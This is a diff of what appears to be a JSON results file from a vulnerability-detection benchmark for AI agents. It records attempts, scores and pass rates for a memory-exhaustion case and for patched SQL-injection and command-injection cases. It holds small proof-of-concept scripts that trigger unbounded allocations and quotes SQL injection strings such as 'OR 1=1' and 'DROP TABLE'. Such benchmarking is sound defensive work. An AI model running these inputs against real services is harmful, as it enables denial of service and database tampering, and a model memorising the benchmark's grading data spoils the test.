           "report": {
             "is_vulnerable": true,
-            "vulnerability_type": "Denial of Service (DoS) via Uncontrolled Resource Consumption",
-            "cwe": "CWE-400",
+            "vulnerability_type": "Uncontrolled Resource Consumption",
+            "cwe": "CWE-770",
             "location": {
               "file": "submission.py",
               "function": "read_frame"
             },
-            "reasoning": "The function `read_frame` allocates `bytearray(declared_length)` without any upper bound validation on `declared_length`. An attacker who controls `declared_length` can supply an extremely large value (e.g., 10 GiB as hinted in the commented-out test), causing the process to exhaust available memory and crash — a classic Denial of Service via uncontrolled resource consumption. The code comment itself acknowledges this: `# read_frame(10 * 1024**3, b\"x\")  # would exhaust memory`. In testing, passing 500_000_000 caused the sandbox to be resource-killed (exit code 137)."
+            "reasoning": "The `read_frame` function allocates `bytearray(declared_length)` using the attacker-controlled `declared_length` parameter without any upper bound validation. This allows an attacker to request arbitrarily large memory allocations (e.g., gigabytes) by providing a large `declared_length` value regardless of the actual payload size. The process can be killed by the OOM killer (demonstrated: exit code 137, resource_killed=true for a 1GB allocation), resulting in a denial of service. The comment in the code itself acknowledges this: `read_frame(10 * 1024**3, b\"x\")  # would exhaust memory`. The function also fails to validate that `declared_length` matches the actual payload length, allowing memory waste."
           },
-          "reproduction_script": "import submission\n\n# The vulnerability: declared_length controls a bytearray allocation with no size check.\n# A large value causes memory exhaustion and crashes the process.\ntry:\n    result = submission.read_frame(500_000_000, b'test')\n    print(f\"Allocated {len(result)} bytes without crashing - vulnerability present (no upper bound)\")\nexcept MemoryError:\n    print(\"MemoryError raised - vulnerability confirmed: attacker-controlled allocation exhausts memory\")\nexcept Exception as e:\n    print(f\"Process killed or crashed: {type(e).__name__}: {e}\")\n    print(\"Vulnerability confirmed: unbounded allocation led to resource exhaustion\")",
-          "score": {
-            "case_id": "CASE-10-resource-exhaustion",
-            "detection_correct": true,
-            "type_correct": false,
-            "cwe_correct": true,
-            "function_correct": true,
-            "type_match": {
-              "predicted_raw": "Denial of Service (DoS) via Uncontrolled Resource Consumption",
-              "predicted_canonical": "denial of service via uncontrolled resource consumption",
-              "truth_raw": "Uncontrolled Resource Consumption",
-              "truth_canonical": "Uncontrolled Resource Consumption",
-              "matched": false
-            }
-          },
-          "outcome": null,
-          "retry_count": 0,
-          "end_reason": "submitted",
-          "tokens": 29826,
-          "raw_predicted_type": "Denial of Service (DoS) via Uncontrolled Resource Consumption",
-          "canonical_predicted_type": "denial of service via uncontrolled resource consumption"
-        },
-        {
-          "attempt_index": 2,
-          "report": null,
-          "reproduction_script": null,
-          "score": {
-            "case_id": "CASE-10-resource-exhaustion",
-            "detection_correct": false,
-            "type_correct": false,
-            "cwe_correct": false,
-            "function_correct": false,
-            "type_match": {
-              "predicted_raw": null,
-              "predicted_canonical": null,
-              "truth_raw": "Uncontrolled Resource Consumption",
-              "truth_canonical": "Uncontrolled Resource Consumption",
-              "matched": false
-            }
-          },
-          "outcome": null,
-          "retry_count": 0,
-          "end_reason": "steps",
-          "tokens": 45135,
-          "raw_predicted_type": null,
-          "canonical_predicted_type": null
-        },
-        {
-          "attempt_index": 3,
-          "report": {
-            "is_vulnerable": true,
-            "vulnerability_type": "Uncontrolled Memory Allocation",
-            "cwe": "CWE-789",
-            "location": {
-              "file": "submission.py",
-              "function": "read_frame"
-            },
-            "reasoning": "The function read_frame() takes a declared_length parameter and allocates a bytearray of that size without any upper-bound validation. An attacker who controls declared_length (e.g., from a network protocol's length-prefixed frame) can supply an arbitrarily large value, causing the application to exhaust memory and crash (denial of service). The payload can be tiny while declared_length is huge, making this an asymmetric DoS attack: a 4-byte payload with a 500 MB declared_length causes immediate memory exhaustion."
-          },
-          "reproduction_script": "import submission\n\n# Crafted input: tiny payload but massive declared_length\n# This causes the bytearray allocation to exhaust memory\nresult = submission.read_frame(500_000_000, b\"attack\")\nprint(\"Frame allocated with length:\", len(result))\nprint(\"First 10 bytes:\", result[:10])",
+          "reproduction_script": "import submission\n\n# Reproduction: unbounded memory allocation via attacker-controlled declared_length\nprint(\"REPRODUCTION: Unbounded memory allocation in read_frame()\")\nprint(\"=\" * 60)\n\nattacker_declared_length = 100 * 1024 * 1024  # 100 MB\nattacker_payload = b'A'  # 1 byte\n\nprint(f\"Attacker-controlled declared_length: {attacker_declared_length:,} bytes\")\nprint(f\"Actual payload size: {len(attacker_payload)} byte(s)\")\n\nresult = submission.read_frame(attacker_declared_length, attacker_payload)\nprint(f\"Memory allocated: {len(result):,} bytes\")\nprint(f\"Memory waste: {len(result) - len(attacker_payload):,} bytes\")\nprint()\nprint(\"VULNERABILITY CONFIRMED: No bounds checking on declared_length\")\nprint(\"An attacker can exhaust server memory by sending frames with\")\nprint(\"arbitrarily large declared_length values.\")",
           "score": {
             "case_id": "CASE-10-resource-exhaustion",
             "detection_correct": true,
@@ -1270,7 +1211,7 @@
             "cwe_correct": false,
             "function_correct": true,
             "type_match": {
-              "predicted_raw": "Uncontrolled Memory Allocation",
+              "predicted_raw": "Uncontrolled Resource Consumption",
               "predicted_canonical": "Uncontrolled Resource Consumption",
               "truth_raw": "Uncontrolled Resource Consumption",
               "truth_canonical": "Uncontrolled Resource Consumption",
@@ -1280,26 +1221,94 @@
           "outcome": null,
           "retry_count": 0,
           "end_reason": "submitted",
-          "tokens": 26118,
-          "raw_predicted_type": "Uncontrolled Memory Allocation",
+          "tokens": 60210,
+          "raw_predicted_type": "Uncontrolled Resource Consumption",
           "canonical_predicted_type": "Uncontrolled Resource Consumption"
+        },
+        {
+          "attempt_index": 2,
+          "report": {
+            "is_vulnerable": true,
+            "vulnerability_type": "Uncontrolled Memory Allocation (Denial of Service)",
+            "cwe": "CWE-789",
+            "location": {
+              "file": "submission.py",
+              "function": "read_frame"
+            },
+            "reasoning": "The function `read_frame` allocates a `bytearray` of size `declared_length` without any bounds checking. An attacker who controls the `declared_length` parameter can request an arbitrarily large allocation (e.g., gigabytes), causing memory exhaustion and denial of service. The allocation size is completely independent of the actual payload size — even a 1-byte payload can trigger a multi-gigabyte allocation. The commented-out example in the source code itself acknowledges this: `# read_frame(10 * 1024**3, b\"x\")  # would exhaust memory`. This is a classic CWE-789: the program allocates memory based on attacker-controlled input without enforcing any upper limit."
+          },
+          "reproduction_script": "import submission\n\n# Demonstrate that declared_length controls allocation size with no bounds check.\n# Even a tiny payload triggers a massive allocation when declared_length is large.\n\nsmall_payload = b\"tiny_payload\"  # only 12 bytes\n\n# Request a 100 MB allocation with only a 12-byte payload\nsize_mb = 100\ndeclared_length = size_mb * 1024 * 1024\n\nresult = submission.read_frame(declared_length, small_payload)\n\nprint(f\"Payload size: {len(small_payload)} bytes\")\nprint(f\"Allocated size: {len(result)} bytes ({len(result) / (1024*1024):.1f} MB)\")\nprint(f\"Wasted allocation: {len(result) - len(small_payload)} bytes\")\nprint(f\"VULNERABLE: attacker-controlled declared_length causes unbounded memory allocation\")\n",
+          "score": {
+            "case_id": "CASE-10-resource-exhaustion",
+            "detection_correct": true,
+            "type_correct": true,
+            "cwe_correct": false,
+            "function_correct": true,
+            "type_match": {
+              "predicted_raw": "Uncontrolled Memory Allocation (Denial of Service)",
+              "predicted_canonical": "Uncontrolled Resource Consumption",
+              "truth_raw": "Uncontrolled Resource Consumption",
+              "truth_canonical": "Uncontrolled Resource Consumption",
+              "matched": true
+            }
+          },
+          "outcome": null,
+          "retry_count": 0,
+          "end_reason": "submitted",
+          "tokens": 28051,
+          "raw_predicted_type": "Uncontrolled Memory Allocation (Denial of Service)",
+          "canonical_predicted_type": "Uncontrolled Resource Consumption"
+        },
+        {
+          "attempt_index": 3,
+          "report": {
+            "is_vulnerable": true,
+            "vulnerability_type": "Unbounded Memory Allocation / Denial of Service",
+            "cwe": "CWE-770",
+            "location": {
+              "file": "submission.py",
+              "function": "read_frame"
+            },
+            "reasoning": "The read_frame function allocates a bytearray of size `declared_length` without any bounds checking. The `declared_length` parameter is attacker-controlled (it comes from parsing a network frame header). An attacker can send a frame claiming a huge length (e.g., 10 GB), causing the server to attempt to allocate that much memory, resulting in memory exhaustion and denial of service. The code comment itself acknowledges this: `# read_frame(10 * 1024**3, b\"x\")  # would exhaust memory`. The fix would be to enforce a maximum frame size and reject frames exceeding that limit before allocation."
+          },
+          "reproduction_script": "import submission\n\n# Demonstrate unbounded allocation: the function accepts any declared_length\n# without any upper limit, allowing an attacker to exhaust server memory.\nfor size in [1024, 1024 * 1024, 10 * 1024 * 1024]:\n    result = submission.read_frame(size, b\"x\")\n    print(f\"declared_length={size}: allocated {len(result)} bytes with no bounds check\")\n\nprint(\"VULNERABLE: read_frame accepts arbitrarily large declared_length values\")\nprint(\"An attacker can exhaust memory by sending a frame with a huge declared_length.\")\n",
+          "score": {
+            "case_id": "CASE-10-resource-exhaustion",
+            "detection_correct": true,
+            "type_correct": false,
+            "cwe_correct": false,
+            "function_correct": true,
+            "type_match": {
+              "predicted_raw": "Unbounded Memory Allocation / Denial of Service",
+              "predicted_canonical": "unbounded memory allocation denial of service",
+              "truth_raw": "Uncontrolled Resource Consumption",
+              "truth_canonical": "Uncontrolled Resource Consumption",
+              "matched": false
+            }
+          },
+          "outcome": null,
+          "retry_count": 0,
+          "end_reason": "submitted",
+          "tokens": 35287,
+          "raw_predicted_type": "Unbounded Memory Allocation / Denial of Service",
+          "canonical_predicted_type": "unbounded memory allocation denial of service"
         }
       ],
       "pass_rates": {
         "detection": {
-          "correct": 2,
+          "correct": 3,
           "total": 3
         },
         "type": {
-          "correct": 1,
+          "correct": 2,
           "total": 3
         },
         "cwe": {
-          "correct": 1,
+          "correct": 0,
           "total": 3
         },
         "function": {
-          "correct": 2,
+          "correct": 3,
           "total": 3
         }
       }
@@ -1316,7 +1325,7 @@
             "vulnerability_type": null,
             "cwe": null,
             "location": null,
-            "reasoning": "The login function uses parameterized queries with `?` placeholders (bound parameters), which is the standard safe practice for preventing SQL injection. The user-supplied `username` and `password` values are passed as a tuple to `conn.execute()`, so the database driver treats them strictly as data — never as executable SQL. Attempting the classic `' OR '1'='1` injection returns an empty result set, confirming the query is not vulnerable. No other vulnerability patterns (command injection, path traversal, etc.) are present."
+            "reasoning": "The login function uses parameterized queries with '?' placeholders via conn.execute(query, (username, password)). The database driver treats the parameters as data, not SQL, so injected SQL payloads remain inert. Verified by running the code: login('alice', \"' OR '1'='1\") returns an empty list — the injection is blocked. The hardcoded SQL in _make_db has no user-controlled input. No other vulnerability patterns (exec, eval, subprocess, deserialization, etc.) were found."
           },
           "reproduction_script": null,
           "score": {
@@ -1330,13 +1339,19 @@
           "outcome": null,
           "retry_count": 0,
           "end_reason": "submitted",
-          "tokens": 20171,
+          "tokens": 42587,
           "raw_predicted_type": null,
           "canonical_predicted_type": null
         },
         {
           "attempt_index": 2,
-          "report": null,
+          "report": {
+            "is_vulnerable": false,
+            "vulnerability_type": null,
+            "cwe": null,
+            "location": null,
+            "reasoning": "The login function uses parameterized queries with `?` placeholders: `conn.execute(query, (username, password))`. The SQLite driver treats the bound parameters as data, not as SQL, which prevents SQL injection. The `' OR '1'='1` payload (and all other tested injection attempts) are handled as literal string values and do not alter the query structure. No other vulnerability types (command injection, path traversal, deserialization, hardcoded secrets in production, etc.) are present — the hardcoded credentials exist only in an ephemeral in-memory database used for demonstration."
+          },
           "reproduction_script": null,
           "score": {
             "case_id": "NEG-01-sql-injection-patched",
@@ -1348,8 +1363,8 @@
           },
           "outcome": null,
           "retry_count": 0,
-          "end_reason": "wall-clock",
-          "tokens": 43478,
+          "end_reason": "submitted",
+          "tokens": 39796,
           "raw_predicted_type": null,
           "canonical_predicted_type": null
         },
@@ -1360,7 +1375,7 @@
             "vulnerability_type": null,
             "cwe": null,
             "location": null,
-            "reasoning": "The `login` function uses parameterized queries with `?` placeholders, passing user-supplied `username` and `password` as a tuple to `conn.execute(query, (username, password))`. This is the correct and safe approach to prevent SQL injection — the database driver treats the values strictly as data, not as SQL code. All tested injection payloads (e.g., `' OR '1'='1`, `' UNION SELECT ...`, `'; DROP TABLE ...`) return empty result sets, confirming the defense works. No other vulnerability classes (command injection, path traversal, deserialization, etc.) are present in the code."
+            "reasoning": "The login function uses parameterized SQL queries with '?' placeholders. The username and password are passed as a tuple to conn.execute(), which ensures the SQLite driver treats them as literal data rather than executable SQL. SQL injection payloads like \"' OR '1'='1\" are rendered inert and return empty result sets. No other vulnerability class (command injection, path traversal, deserialization, etc.) is present — the code only imports sqlite3, uses an in-memory database, hardcodes the query structure, and returns query results without any dangerous downstream processing."
           },
           "reproduction_script": null,
           "score": {
@@ -1374,7 +1389,7 @@
           "outcome": null,
           "retry_count": 0,
           "end_reason": "submitted",
-          "tokens": 26810,
+          "tokens": 31671,
           "raw_predicted_type": null,
           "canonical_predicted_type": null
         }
@@ -1397,20 +1412,29 @@
       "attempts": [
         {
           "attempt_index": 1,
-          "report": null,
+          "report": {
+            "is_vulnerable": false,
+            "vulnerability_type": null,
+            "cwe": null,
+            "location": {
+              "file": "submission.py",
+              "function": "ping"
+            },
+            "reasoning": "The function uses subprocess.check_output with a list of arguments and shell=False (the default). This is the secure pattern for calling external processes: each list element is passed as a separate argument directly to the OS exec call, with no shell involved. Therefore, shell metacharacters like ;, &&, |, or backticks in the host parameter are treated as part of a single literal argument to ping, not interpreted as shell commands. No command injection is possible."
+          },
           "reproduction_script": null,
           "score": {
             "case_id": "NEG-02-command-injection-patched",
             "detection_correct": true,
             "type_correct": null,
             "cwe_correct": null,
-            "function_correct": false,
+            "function_correct": true,
             "type_match": null
           },
           "outcome": null,
           "retry_count": 0,
-          "end_reason": "steps",
-          "tokens": 70737,
+          "end_reason": "submitted",
+          "tokens": 32158,
           "raw_predicted_type": null,
           "canonical_predicted_type": null
         },
@@ -1429,7 +1453,7 @@
           "outcome": null,
           "retry_count": 0,
           "end_reason": "wall-clock",
-          "tokens": 28914,
+          "tokens": 33463,
           "raw_predicted_type": null,
           "canonical_predicted_type": null
         },
@@ -1448,7 +1472,7 @@
           "outcome": null,
           "retry_count": 0,
           "end_reason": "wall-clock",
-          "tokens": 23494,
+          "tokens": 22755,
           "raw_predicted_type": null,
           "canonical_predicted_type": null
         }
@@ -1459,7 +1483,7 @@
           "total": 3
         },
         "function": {
-          "correct": 0,
+          "correct": 1,
           "total": 3
         }
       }
@@ -1484,7 +1508,7 @@
           "outcome": null,
           "retry_count": 0,
           "end_reason": "steps",
-          "tokens": 49115,
+          "tokens": 71019,
           "raw_predicted_type": null,
           "canonical_predicted_type": null
         },
@@ -1503,7 +1527,7 @@
           "outcome": null,
           "retry_count": 0,
           "end_reason": "steps",
-          "tokens": 67464,
+          "tokens": 63470,
           "raw_predicted_type": null,
           "canonical_predicted_type": null
         },
@@ -1522,7 +1546,7 @@
           "outcome": null,
           "retry_count": 0,
           "end_reason": "steps",
-          "tokens": 45764,
+          "tokens": 67245,
           "raw_predicted_type": null,
           "canonical_predicted_type": null
         }
@@ -1544,11 +1568,11 @@
     "capability_core_max": 30.0,
     "capability_core_pct": 0.7666666666666667,
     "per_dimension_pct": {
-      "detection": 0.9,
-      "type": 0.6666666666666666,
+      "detection": 0.9333333333333333,
+      "type": 0.6333333333333333,
       "cwe": 0.7333333333333333
     },
-    "function_location_pct": 0.6923076923076923,
+    "function_location_pct": 0.7435897435897436,
     "false_positive_rate": 0.0,
     "per_case_pass_rates": {
       "CASE-01-sql-injection": {
@@ -1611,7 +1635,7 @@
           "total": 3
         },
         "type": {
-          "correct": 3,
+          "correct": 2,
           "total": 3
         },
         "cwe": {
@@ -1665,7 +1689,7 @@
           "total": 3
         },
         "type": {
-          "correct": 1,
+          "correct": 0,
           "total": 3
         },
         "cwe": {
@@ -1687,7 +1711,7 @@
           "total": 3
         },
         "cwe": {
-          "correct": 0,
+          "correct": 1,
           "total": 3
         },
         "function": {
@@ -1715,19 +1739,19 @@
       },
       "CASE-10-resource-exhaustion": {
         "detection": {
-          "correct": 2,
+          "correct": 3,
           "total": 3
         },
         "type": {
-          "correct": 1,
+          "correct": 2,
           "total": 3
         },
         "cwe": {
-          "correct": 1,
+          "correct": 0,
           "total": 3
         },
         "function": {
-          "correct": 2,
+          "correct": 3,
           "total": 3
         }
       },
@@ -1747,7 +1771,7 @@
           "total": 3
         },
         "function": {
-          "correct": 0,
+          "correct": 1,
           "total": 3
         }
       },
